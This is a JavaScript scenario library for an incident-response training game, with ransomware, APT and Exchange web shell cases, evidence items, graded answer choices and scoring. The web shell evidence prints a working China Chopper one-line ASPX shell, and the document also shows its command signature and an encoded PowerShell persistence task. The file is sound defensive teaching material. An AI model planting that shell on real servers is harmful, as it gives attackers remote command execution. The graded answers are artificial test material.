/**
 * Comprehensive Scenario Library
 * Real-world incident response scenarios based on actual attacks
 */

class ScenarioLibrary {
  constructor(iocLibrary) {
    this.iocLibrary = iocLibrary;
    this.scenarios = this.initializeScenarios();
  }

  initializeScenarios() {
    return {
      // ==================== RANSOMWARE ATTACK ====================
      'ransomware_001': {
        id: 'ransomware_001',
        title: 'Ransomware Attack via Cobalt Strike',
        category: 'Ransomware',
        difficulty: 'hard',
        estimatedTime: 30,
        description: 'Your organization has been hit by ransomware. Initial access was through a phishing email, followed by Cobalt Strike deployment and lateral movement.',

        briefing: `
          <h2>CRITICAL INCIDENT</h2>
          <p><strong>Time:</strong> 03:42 AM</p>
          <p><strong>Alert:</strong> Multiple systems reporting file encryption</p>
          <p><strong>Impact:</strong> 50+ workstations encrypted, file shares inaccessible</p>
          <p><strong>Initial Vector:</strong> Unknown</p>

          <h3>Your Mission:</h3>
          <p>You are the incident response lead. Your team must:</p>
          <ul>
            <li>Identify the initial access method</li>
            <li>Determine the attack timeline</li>
            <li>Contain the spread</li>
            <li>Eradicate the threat</li>
            <li>Prevent data exfiltration</li>
          </ul>
        `,

        objectives: [
          {
            id: 'obj_1',
            description: 'Analyze the SIEM to find initial access',
            completed: false,
            points: 100
          },
          {
            id: 'obj_2',
            description: 'Identify Cobalt Strike beacons',
            completed: false,
            points: 150
          },
          {
            id: 'obj_3',
            description: 'Contain infected systems',
            completed: false,
            points: 100
          },
          {
            id: 'obj_4',
            description: 'Identify ransomware binary and IOCs',
            completed: false,
            points: 150
          },
          {
            id: 'obj_5',
            description: 'Execute remediation plan',
            completed: false,
            points: 200
          }
        ],

        phases: [
          {
            name: 'detection',
            title: 'Detection & Analysis',
            description: 'Identify what happened and how',
            tools: ['siem', 'edr', 'network_monitor'],
            evidence: [
              {
                id: 'ev_phishing',
                type: 'email',
                timestamp: '2025-11-06 14:23:15',
                description: 'Phishing email with malicious attachment',
                details: {
                  from: 'support@microsft-365.com',
                  subject: 'Important: Update Your Password',
                  attachment: 'password_update.xlsx',
                  recipient: 'john.smith@company.com'
                },
                iocs: ['Typosquatted domain', 'Macro-enabled Excel file'],
                correctAnalysis: 'Initial access via phishing'
              },
              {
                id: 'ev_beacon',
                type: 'network',
                timestamp: '2025-11-06 14:28:42',
                description: 'Suspicious outbound beacon traffic',
                details: {
                  source: '192.168.1.105',
                  destination: '203.0.113.42:443',
                  protocol: 'HTTPS',
                  pattern: 'Regular beaconing every 60s with 10% jitter'
                },
                iocs: ['cobalt_strike'],
                correctAnalysis: 'Cobalt Strike C2 beacon'
              },
              {
                id: 'ev_lateral',
                type: 'host',
                timestamp: '2025-11-06 15:45:12',
                description: 'Unusual SMB activity between workstations',
                details: {
                  source: 'WS-SMITH-105',
                  destination: 'WS-JONES-110',
                  tool: 'PsExec',
                  user: 'DOMAIN\\admin_backup'
                },
                iocs: ['Lateral movement', 'Compromised credentials'],
                correctAnalysis: 'Lateral movement using stolen credentials'
              },
              {
                id: 'ev_encryption',
                type: 'host',
                timestamp: '2025-11-07 03:40:22',
                description: 'Mass file modification activity',
                details: {
                  process: 'svchost.exe (renamed ransomware)',
                  files_affected: 45237,
                  extension_changed: '.encrypted',
                  ransom_note: 'README_DECRYPT.txt'
                },
                iocs: ['File encryption', 'Ransomware execution'],
                correctAnalysis: 'Ransomware payload execution'
              }
            ]
          },
          {
            name: 'containment',
            title: 'Containment',
            description: 'Stop the attack from spreading',
            actions: [
              {
                id: 'act_isolate',
                description: 'Isolate infected systems',
                options: [
                  {
                    text: 'Disable network ports on switches',
                    correct: true,
                    points: 50,
                    feedback: 'Correct! This prevents lateral movement while preserving evidence.'
                  },
                  {
                    text: 'Shut down all servers immediately',
                    correct: false,
                    points: -30,
                    feedback: 'Too aggressive - this would cause business disruption and potential data loss.'
                  },
                  {
                    text: 'Block C2 domain at firewall only',
                    correct: false,
                    points: 10,
                    feedback: 'Not sufficient - attackers may have alternative C2 channels.'
                  }
                ]
              },
              {
                id: 'act_credentials',
                description: 'Handle compromised credentials',
                options: [
                  {
                    text: 'Reset all admin passwords immediately',
                    correct: true,
                    points: 75,
                    feedback: 'Correct! Prevents further lateral movement with stolen credentials.'
                  },
                  {
                    text: 'Wait until after remediation to reset passwords',
                    correct: false,
                    points: -50,
                    feedback: 'Dangerous - attackers can continue using stolen credentials.'
                  },
                  {
                    text: 'Only reset passwords for confirmed compromised accounts',
                    correct: false,
                    points: 20,
                    feedback: 'Risky - you may not have identified all compromised accounts.'
                  }
                ]
              }
            ]
          },
          {
            name: 'eradication',
            title: 'Eradication',
            description: 'Remove the threat completely',
            actions: [
              {
                id: 'act_remove_beacon',
                description: 'Eradicate Cobalt Strike beacons',
                options: [
                  {
                    text: 'Kill processes, remove registry persistence, delete files',
                    correct: true,
                    points: 100,
                    feedback: 'Comprehensive approach - removes all beacon components.'
                  },
                  {
                    text: 'Just kill the beacon process',
                    correct: false,
                    points: -20,
                    feedback: 'Insufficient - persistence mechanisms will relaunch the beacon.'
                  },
                  {
                    text: 'Reimage all systems immediately without analysis',
                    correct: false,
                    points: 30,
                    feedback: 'Destroys forensic evidence - analyze first, then reimage.'
                  }
                ]
              }
            ]
          },
          {
            name: 'recovery',
            title: 'Recovery',
            description: 'Restore operations safely',
            actions: [
              {
                id: 'act_restore',
                description: 'Restore encrypted files',
                options: [
                  {
                    text: 'Restore from clean backups after verification',
                    correct: true,
                    points: 100,
                    feedback: 'Correct! Verify backups are clean before restoration.'
                  },
                  {
                    text: 'Pay the ransom to get decryption key',
                    correct: false,
                    points: -100,
                    feedback: 'Never recommended - funds criminals and no guarantee of decryption.'
                  },
                  {
                    text: 'Use free decryption tools from internet',
                    correct: false,
                    points: 10,
                    feedback: 'Some work for specific ransomware variants, but verify legitimacy first.'
                  }
                ]
              }
            ]
          },
          {
            name: 'lessons_learned',
            title: 'Lessons Learned',
            description: 'Document and improve',
            questions: [
              {
                question: 'What was the root cause?',
                answer: 'Phishing email with malicious Excel attachment due to lack of email filtering and user awareness',
                points: 50
              },
              {
                question: 'What controls could have prevented this?',
                answer: 'Email security gateway, disable macros, user security training, MFA, endpoint protection',
                points: 50
              }
            ]
          }
        ],

        scoring: {
          perfect: 1000,
          excellent: 800,
          good: 600,
          passing: 400
        },

        hints: [
          {
            phase: 'detection',
            hint: 'Check email logs first - many ransomware attacks start with phishing'
          },
          {
            phase: 'detection',
            hint: 'Look for beaconing patterns in network traffic - regular intervals with jitter'
          },
          {
            phase: 'containment',
            hint: 'Isolate systems at network level to preserve forensic evidence'
          }
        ]
      },

      // ==================== APT INTRUSION ====================
      'apt_001': {
        id: 'apt_001',
        title: 'Advanced Persistent Threat - Credential Harvesting',
        category: 'APT',
        difficulty: 'expert',
        estimatedTime: 45,
        description: 'A sophisticated APT group has established persistence in your network. They are using Mimikatz to harvest credentials and are preparing for data exfiltration.',

        briefing: `
          <h2>ADVANCED PERSISTENT THREAT</h2>
          <p><strong>Classification:</strong> TOP SECRET</p>
          <p><strong>Threat Actor:</strong> APT29 (Suspected)</p>
          <p><strong>Alert:</strong> EDR detected LSASS memory access anomaly</p>

          <h3>Situation:</h3>
          <p>Your threat intel team has identified indicators matching APT29 tactics.
          They've likely been in the network for weeks, slowly escalating privileges
          and harvesting credentials.</p>

          <h3>Objectives:</h3>
          <ul>
            <li>Identify all compromised systems</li>
            <li>Determine what data has been accessed</li>
            <li>Find persistence mechanisms</li>
            <li>Safely eradicate the threat without alerting attackers</li>
          </ul>
        `,

        objectives: [
          {
            id: 'obj_apt_1',
            description: 'Detect Mimikatz execution',
            completed: false,
            points: 150
          },
          {
            id: 'obj_apt_2',
            description: 'Identify compromised credentials',
            completed: false,
            points: 150
          },
          {
            id: 'obj_apt_3',
            description: 'Find APT persistence mechanisms',
            completed: false,
            points: 200
          },
          {
            id: 'obj_apt_4',
            description: 'Assess data exfiltration risk',
            completed: false,
            points: 150
          },
          {
            id: 'obj_apt_5',
            description: 'Execute coordinated remediation',
            completed: false,
            points: 250
          }
        ],

        phases: [
          {
            name: 'threat_hunt',
            title: 'Threat Hunting',
            description: 'Proactively search for APT indicators',
            evidence: [
              {
                id: 'ev_lsass',
                type: 'edr_alert',
                timestamp: '2025-11-06 08:15:33',
                description: 'Unusual process accessed LSASS memory',
                details: {
                  process: 'powershell.exe',
                  parent: 'winword.exe',
                  target: 'lsass.exe',
                  access_rights: 'PROCESS_VM_READ',
                  user: 'DOMAIN\\accounting_clerk'
                },
                iocs: ['mimikatz'],
                correctAnalysis: 'Mimikatz loaded via PowerShell from Word macro'
              },
              {
                id: 'ev_golden_ticket',
                type: 'kerberos_log',
                timestamp: '2025-11-06 09:42:18',
                description: 'Kerberos ticket with unusual properties',
                details: {
                  ticket_lifetime: '87600 hours (10 years)',
                  user: 'krbtgt',
                  workstation: 'UNKNOWN',
                  event_id: 4768
                },
                iocs: ['mimikatz'],
                correctAnalysis: 'Golden Ticket attack - forged Kerberos ticket'
              },
              {
                id: 'ev_scheduled_task',
                type: 'persistence',
                timestamp: '2025-11-05 22:13:45',
                description: 'Scheduled task created on domain controller',
                details: {
                  task_name: 'Windows Update Checker',
                  action: 'powershell.exe -enc JABj...  ',
                  trigger: 'Daily at 3 AM',
                  user: 'SYSTEM'
                },
                iocs: ['Encoded PowerShell', 'Persistence'],
                correctAnalysis: 'Persistence via scheduled task with encoded payload'
              }
            ]
          }
        ],

        scoring: {
          perfect: 1200,
          excellent: 950,
          good: 700,
          passing: 500
        }
      },

      // ==================== WEB SHELL ATTACK ====================
      'webshell_001': {
        id: 'webshell_001',
        title: 'China Chopper Web Shell on Exchange Server',
        category: 'Web Attack',
        difficulty: 'medium',
        estimatedTime: 25,
        description: 'Attackers have exploited ProxyShell vulnerability to deploy China Chopper webshell on your Exchange server.',

        briefing: `
          <h2>WEB SERVER COMPROMISE</h2>
          <p><strong>Alert:</strong> IIS worker process spawning command shells</p>
          <p><strong>Affected System:</strong> Exchange Server (mail.company.com)</p>
          <p><strong>Vulnerability:</strong> ProxyShell (CVE-2021-34473)</p>

          <h3>Immediate Concerns:</h3>
          <ul>
            <li>Webshell provides remote command execution</li>
            <li>Access to all email data</li>
            <li>Potential for lateral movement</li>
            <li>Data exfiltration risk</li>
          </ul>
        `,

        objectives: [
          {
            id: 'obj_web_1',
            description: 'Locate the webshell file',
            completed: false,
            points: 100
          },
          {
            id: 'obj_web_2',
            description: 'Analyze IIS logs for attacker activity',
            completed: false,
            points: 150
          },
          {
            id: 'obj_web_3',
            description: 'Identify exploited vulnerability',
            completed: false,
            points: 100
          },
          {
            id: 'obj_web_4',
            description: 'Remove webshell and patch server',
            completed: false,
            points: 200
          }
        ],

        phases: [
          {
            name: 'investigation',
            title: 'Investigation',
            description: 'Find and analyze the webshell',
            evidence: [
              {
                id: 'ev_process',
                type: 'process_alert',
                timestamp: '2025-11-07 10:22:11',
                description: 'w3wp.exe spawned cmd.exe',
                details: {
                  process_tree: 'w3wp.exe → cmd.exe → whoami.exe',
                  command_line: 'cmd.exe /c whoami &echo [S]&cd&echo [E]',
                  user: 'IIS APPPOOL\\DefaultAppPool'
                },
                iocs: ['china_chopper'],
                correctAnalysis: 'China Chopper signature: &echo [S]&cd&echo [E]'
              },
              {
                id: 'ev_webshell_file',
                type: 'file_system',
                timestamp: '2025-11-06 18:45:33',
                description: 'Suspicious ASPX file in OAB directory',
                details: {
                  path: 'C:\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\OAB\\auth.aspx',
                  size: '186 bytes',
                  content: '<%@ Page Language="Jscript"%><%eval(Request.Item["password"],"unsafe");%>',
                  created: '2025-11-06 18:45:33'
                },
                iocs: ['china_chopper'],
                correctAnalysis: 'China Chopper one-line webshell'
              },
              {
                id: 'ev_iis_logs',
                type: 'web_logs',
                timestamp: '2025-11-06 18:46:00 - 2025-11-07 10:30:00',
                description: 'Repeated POST requests to auth.aspx',
                details: {
                  requests: 247,
                  source_ip: '45.142.212.61',
                  user_agent: '',
                  post_data: 'password=Response.Write(...)'
                },
                iocs: ['china_chopper'],
                correctAnalysis: 'Attacker using China Chopper client'
              }
            ]
          }
        ],

        scoring: {
          perfect: 800,
          excellent: 650,
          good: 500,
          passing: 350
        }
      },

      // ==================== DEMO SCENARIO (QUICK) ====================
      'demo_scenario': {
        id: 'demo_scenario',
        title: 'Interactive Demo - Detect Cobalt Strike',
        category: 'Tutorial',
        difficulty: 'beginner',
        estimatedTime: 10,
        description: 'Learn how to use the platform by detecting Cobalt Strike beacons in network traffic.',

        briefing: `
          <h2>WELCOME TO CYBERSIM ULTRA</h2>
          <p>This interactive demo will teach you the basics of incident response using our platform.</p>

          <h3>Scenario:</h3>
          <p>You've received an alert about suspicious network traffic. Your job is to:</p>
          <ul>
            <li>Analyze the SIEM data</li>
            <li>Identify Cobalt Strike beacons</li>
            <li>Understand the IOCs</li>
            <li>Take appropriate action</li>
          </ul>

          <p><strong>This is a safe training environment - feel free to explore!</strong></p>
        `,

        objectives: [
          {
            id: 'demo_1',
            description: 'Open the SIEM tool',
            completed: false,
            points: 50
          },
          {
            id: 'demo_2',
            description: 'Find the beaconing traffic',
            completed: false,
            points: 100
          },
          {
            id: 'demo_3',
            description: 'Identify it as Cobalt Strike',
            completed: false,
            points: 100
          },
          {
            id: 'demo_4',
            description: 'Review the IOC library',
            completed: false,
            points: 50
          }
        ],

        phases: [
          {
            name: 'tutorial',
            title: 'Tutorial',
            description: 'Learn the tools',
            evidence: [
              {
                id: 'demo_ev_1',
                type: 'network',
                timestamp: '2025-11-07 12:00:00',
                description: 'Regular HTTPS traffic to external IP',
                details: {
                  source: '192.168.1.50',
                  destination: '203.0.113.42:443',
                  interval: '60 seconds ±6 seconds',
                  bytes: '4096-8192 per connection'
                },
                iocs: ['cobalt_strike'],
                correctAnalysis: 'Cobalt Strike beacon with 10% jitter'
              }
            ]
          }
        ],

        scoring: {
          perfect: 300,
          excellent: 250,
          good: 200,
          passing: 150
        }
      }
    };
  }

  getScenario(scenarioId) {
    return this.scenarios[scenarioId] || null;
  }

  getAllScenarios() {
    return Object.values(this.scenarios);
  }

  getScenariosByDifficulty(difficulty) {
    return Object.values(this.scenarios).filter(s => s.difficulty === difficulty);
  }

  getScenariosByCategory(category) {
    return Object.values(this.scenarios).filter(s => s.category === category);
  }
}

// Export for use in main game
if (typeof module !== 'undefined' && module.exports) {
  module.exports = ScenarioLibrary;
}
